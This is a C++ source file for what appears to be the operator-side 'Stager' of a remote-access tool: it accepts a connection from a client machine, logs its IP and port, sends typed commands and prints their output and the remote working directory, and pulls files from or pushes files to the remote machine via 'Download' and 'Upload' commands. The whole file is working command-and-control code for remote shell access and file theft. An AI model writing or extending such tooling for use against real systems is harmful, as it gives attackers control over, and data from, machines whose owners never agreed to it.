#include "Stager.h"

void Stager::OnConnect(Connection newConnection)
{
    std::cout << "[+] Accepted new connection: [ ip: " << newConnection.GetIp() << ", port: " << newConnection.GetPort() << "]" << std::endl;

    Packet packet;
    newConnection.Recv(packet);

    uint32_t packetSize = packet.PacketSize();

    while (packet.GetPacketOffset() < packetSize)
        std::cout << packet.ExtractString();
}

bool Stager::Logic(const std::string& cmd)
{
    Packet packet;

    if (cmd == "Quit")
    {
        return false;
    }

    packet.InsertString(cmd);
    if (not clientConn.Send(packet))
    {
        std::cerr << "Error at Send (command)" << std::endl;
        return false;
    }

    if (cmd.rfind("Download ", 0) == 0)
    {
        if (not clientConn.RecvFile())
        {
            std::cerr << "Error at RecvFile." << std::endl;
            return false;
        }
    }

    else if (cmd.rfind("Upload ", 0) == 0)
    {
        std::string filename = cmd.substr(cmd.find(" ") + 1);

        if (std::filesystem::exists(filename))
        {
            if (not clientConn.SendFile(filename))
            {
                std::cerr << "Error at Sendfile" << std::endl;
                return false;
            }
        }

        else
        {
            std::cout << "No such file or Directory." << "\n>> ";
            return true;

        }

    }

    else
    {
        if (not clientConn.Recv(packet))
        {
            std::cerr << "Error at Recv (command output)" << std::endl;
            return false;
        }

        std::cout << packet.ExtractString().erase(0, cmd.size() + 1);
    }

    packet.Clear();
    if (not clientConn.Recv(packet))
    {
        std::cerr << "Error at Recv (pwd)" << std::endl;
        return false;
    }

    std::cout << '\n' << packet.ExtractString() << ">";

	return true;
}
